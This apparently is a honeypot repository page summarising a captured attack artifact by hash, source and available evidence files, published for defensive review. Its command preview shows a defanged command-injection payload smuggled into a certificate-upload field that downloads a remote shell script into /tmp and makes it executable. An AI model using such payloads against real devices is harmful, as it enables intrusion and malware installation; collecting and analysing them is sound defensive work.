# 041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget hxxp://89[.]32[.]41[.]XXX/bins/kla.sh -O k;chmod +x
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
